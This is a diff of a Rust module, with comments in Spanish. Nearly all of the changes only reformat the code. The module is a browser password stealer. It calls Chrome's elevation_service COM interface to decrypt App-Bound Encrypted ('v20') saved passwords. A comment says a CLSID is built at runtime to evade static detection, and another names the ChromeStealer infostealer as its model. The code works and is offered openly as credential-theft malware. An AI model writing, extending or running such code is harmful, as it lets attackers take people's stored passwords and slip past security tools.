@@ -2,13 +2,13 @@
 // Desencripta passwords v20 (App-Bound Encryption) usando elevation_service.exe
 
 use std::ptr;
-use winapi::um::combaseapi::{CoInitializeEx, CoCreateInstance, CoUninitialize};
-use winapi::um::objbase::COINIT_MULTITHREADED;
+use winapi::ctypes::c_void;
 use winapi::shared::guiddef::{GUID, REFCLSID, REFIID};
 use winapi::shared::winerror::S_OK;
 use winapi::shared::wtypesbase::CLSCTX_LOCAL_SERVER;
+use winapi::um::combaseapi::{CoCreateInstance, CoInitializeEx, CoUninitialize};
+use winapi::um::objbase::COINIT_MULTITHREADED;
 use winapi::um::unknwnbase::{IUnknown, IUnknownVtbl};
-use winapi::ctypes::c_void;
 
 // Función para construir CLSID en runtime (evita detección estática)
 fn get_elevation_service_clsid() -> GUID {
@@ -71,7 +71,7 @@ pub struct IElevatorVtbl {
 /// Estructura para manejar la conexión con Elevation Service
 pub struct ElevationServiceClient {
     elevator: *mut IElevator,
-    com_initialized: bool,  // Track if we initialized COM
+    com_initialized: bool, // Track if we initialized COM
 }
 
 impl ElevationServiceClient {
@@ -81,7 +81,7 @@ impl ElevationServiceClient {
             // Inicializar COM
             let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
             let com_initialized = hr >= 0 || hr == 0x00000001; // S_OK or S_FALSE
-            
+
             if !com_initialized {
                 return Err(format!("CoInitializeEx failed: 0x{:08X}", hr));
             }
@@ -104,7 +104,10 @@ impl ElevationServiceClient {
                 if com_initialized {
                     CoUninitialize();
                 }
-                return Err(format!("CoCreateInstance failed: 0x{:08X} - Elevation Service no disponible", hr));
+                return Err(format!(
+                    "CoCreateInstance failed: 0x{:08X} - Elevation Service no disponible",
+                    hr
+                ));
             }
 
             if elevator.is_null() {
@@ -114,7 +117,10 @@ impl ElevationServiceClient {
                 return Err("Elevation Service pointer is null".to_string());
             }
 
-            Ok(Self { elevator, com_initialized })
+            Ok(Self {
+                elevator,
+                com_initialized,
+            })
         }
     }
 
@@ -122,8 +128,8 @@ impl ElevationServiceClient {
     pub fn decrypt_v20(&self, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
         use std::fs::OpenOptions;
         use std::io::Write;
-    use winapi::um::combaseapi::CoTaskMemFree;
-    use winapi::ctypes::c_void;
+        use winapi::ctypes::c_void;
+        use winapi::um::combaseapi::CoTaskMemFree;
         let temp_dir = std::env::temp_dir();
         let debug_path = temp_dir.join("elevation_service_debug.txt");
         let mut debug = OpenOptions::new()
@@ -132,7 +138,12 @@ impl ElevationServiceClient {
             .open(debug_path)
             .unwrap();
 
-        writeln!(debug, "[decrypt_v20] Called with {} bytes", encrypted_data.len()).ok();
+        writeln!(
+            debug,
+            "[decrypt_v20] Called with {} bytes",
+            encrypted_data.len()
+        )
+        .ok();
         // Enviar el buffer tal cual, sin prefijos ni manipulación (como ChromeStealer)
         let payload = encrypted_data;
         unsafe {
@@ -159,10 +170,18 @@ impl ElevationServiceClient {
                 return Err("Decrypted data is null or empty".to_string());
             }
 
-            writeln!(debug, "[decrypt_v20] DecryptData SUCCESS, {} bytes", decrypted_size).ok();
-            let decrypted_data = std::slice::from_raw_parts(decrypted_ptr, decrypted_size as usize).to_vec();
+            writeln!(
+                debug,
+                "[decrypt_v20] DecryptData SUCCESS, {} bytes",
+                decrypted_size
+            )
+            .ok();
+            let decrypted_data =
+                std::slice::from_raw_parts(decrypted_ptr, decrypted_size as usize).to_vec();
             // Liberar memoria asignada por COM
-            CoTaskMemFree(std::mem::transmute::<*mut u8, *mut winapi::ctypes::c_void>(decrypted_ptr));
+            CoTaskMemFree(std::mem::transmute::<*mut u8, *mut winapi::ctypes::c_void>(
+                decrypted_ptr,
+            ));
             Ok(decrypted_data)
         }
     }
@@ -179,12 +198,22 @@ impl ElevationServiceClient {
             .open(debug_path)
             .unwrap();
 
-        writeln!(debug, "[decrypt_password] Called with {} bytes", encrypted_data.len()).ok();
+        writeln!(
+            debug,
+            "[decrypt_password] Called with {} bytes",
+            encrypted_data.len()
+        )
+        .ok();
         let decrypted_bytes = match self.decrypt_v20(encrypted_data) {
             Ok(data) => {
-                writeln!(debug, "[decrypt_password] decrypt_v20 OK, {} bytes", data.len()).ok();
+                writeln!(
+                    debug,
+                    "[decrypt_password] decrypt_v20 OK, {} bytes",
+                    data.len()
+                )
+                .ok();
                 data
-            },
+            }
             Err(e) => {
                 writeln!(debug, "[decrypt_password] decrypt_v20 ERROR: {}", e).ok();
                 return Err(e);
@@ -194,7 +223,7 @@ impl ElevationServiceClient {
             Ok(s) => {
                 writeln!(debug, "[decrypt_password] UTF8 OK").ok();
                 Ok(s)
-            },
+            }
             Err(e) => {
                 writeln!(debug, "[decrypt_password] UTF8 ERROR: {}", e).ok();
                 Err(format!("Invalid UTF-8: {}", e))
@@ -210,7 +239,7 @@ impl Drop for ElevationServiceClient {
                 // Release COM object
                 ((*(*self.elevator).lpVtbl).Release)(self.elevator);
             }
-            
+
             // Only uninitialize COM if we initialized it
             if self.com_initialized {
                 CoUninitialize();
@@ -231,7 +260,12 @@ pub fn try_decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<Strin
         .open(debug_path)
         .unwrap();
 
-    writeln!(debug, "[ElevationService] Called with {} bytes", encrypted_data.len()).ok();
+    writeln!(
+        debug,
+        "[ElevationService] Called with {} bytes",
+        encrypted_data.len()
+    )
+    .ok();
     if encrypted_data.len() < 3 || &encrypted_data[0..3] != b"v20" {
         writeln!(debug, "[ElevationService] Not v20 format").ok();
         return None;
@@ -243,22 +277,27 @@ pub fn try_decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<Strin
             Ok(client) => {
                 writeln!(debug, "[ElevationService] COM client OK").ok();
                 let encrypted_payload = &encrypted_data[3..];
-                writeln!(debug, "[ElevationService] Decrypting payload ({} bytes)...", encrypted_payload.len()).ok();
+                writeln!(
+                    debug,
+                    "[ElevationService] Decrypting payload ({} bytes)...",
+                    encrypted_payload.len()
+                )
+                .ok();
                 match client.decrypt_password(encrypted_payload) {
                     Ok(password) => {
                         writeln!(debug, "[ElevationService] Decrypt SUCCESS").ok();
                         Some(password)
-                    },
+                    }
                     Err(e) => {
                         writeln!(debug, "[ElevationService] Decrypt ERROR: {}", e).ok();
                         None
-                    },
+                    }
                 }
-            },
+            }
             Err(e) => {
                 writeln!(debug, "[ElevationService] COM client ERROR: {}", e).ok();
                 None
-            },
+            }
         }
     }));
     match result {
